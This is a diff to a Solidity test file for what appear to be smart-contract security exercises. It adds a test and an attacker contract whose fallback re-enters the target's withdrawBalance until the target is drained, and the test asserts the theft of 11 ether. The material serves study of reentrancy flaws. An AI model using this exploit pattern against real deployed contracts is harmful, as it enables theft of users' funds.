@@ -15,7 +15,8 @@ import {R0_Q2,
         R0_Q12,
         R0_Q13,
         R0_Q13_V2,
-        R0_Q14} from "../src/Race0.sol";
+        R0_Q14,
+        R0_Q15} from "../src/Race0.sol";
 
 // import ERC1967Proxy for upgradable contract tests
 import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
@@ -638,10 +639,11 @@ contract R0_Q14_Test is Test {
         r0_q14.payRewards(recipients, amounts);
 
         // however, if the ERC20ReturnFalseMock is used the transfer function does not revert but instead returns false
-        // in this situation the transfer could fail sliennty
+        // in this situation the transfer could fail sliently
         MyBadToken erc20MockReturnFalse = new MyBadToken();
         // calling transfer will always return false and never revert
         assertFalse(erc20MockReturnFalse.transfer(address(0x123), 1 ether));
+        // deploy a new contract that uses MyBadToken
         R0_Q14 r0_q14_returns_false = new R0_Q14(admin, address(erc20MockReturnFalse));
         vm.prank(admin);
         // no revert, fails silenntly if trasnfering real tokens
@@ -651,4 +653,60 @@ contract R0_Q14_Test is Test {
 
 contract MyBadToken is ERC20ReturnFalseMock {
     constructor() ERC20("MyBadToken", "MBT") {}
+}
+
+contract R0_Q15_Test is Test {
+    R0_Q15 r0_q15;
+    R0_Q15_Attacker r0_q15_attacker;
+    uint256 constant INITIAL_DEPOSIT = 1 ether;
+
+    function setUp() public {
+        // deploy the target contract
+        r0_q15 = new R0_Q15();
+        // deploy the attacker contract
+        r0_q15_attacker = new R0_Q15_Attacker(payable(r0_q15));
+        // send 1 ether to the attacker contract so it can deposit it into the target
+        payable(r0_q15_attacker).transfer(INITIAL_DEPOSIT);
+        r0_q15_attacker.deposit();
+        // confirm the target updated the internal accounts mapping
+        assertEq(r0_q15.balances(address(r0_q15_attacker)), INITIAL_DEPOSIT);
+        // transfer more Ether directly to the target contract for 
+        // the attacker to drain during the reentrancy attack
+        payable(r0_q15).transfer(10 ether);
+    }
+
+    function test_reentrancyAttack() public {
+        // total balance of the target contract should be the 1 ether 
+        // from the attacker + 10 ether 'donated' during deployment
+        assertEq(address(r0_q15).balance, 11 ether);
+        // attack the target contract
+        r0_q15_attacker.attack();
+        // assert target has been drained
+        assertEq(address(r0_q15).balance, 0 ether);
+        // assert attacker has all the ether
+        assertEq(address(r0_q15_attacker).balance, 11 ether);
+    }
+}
+
+contract R0_Q15_Attacker {
+    R0_Q15 target;
+    constructor(address payable _target) {
+        target = R0_Q15(_target);
+    }
+
+    function deposit() external {
+        target.deposit{value: 1 ether}();
+    }
+
+    function attack() public {
+        // call withdrawBalance on the target
+        target.withdrawBalance();
+    }
+
+    fallback() external payable {
+        if (address(target).balance >= msg.value) {
+            // keep attacking until target contract is drained
+            attack();
+        }
+    }
 }
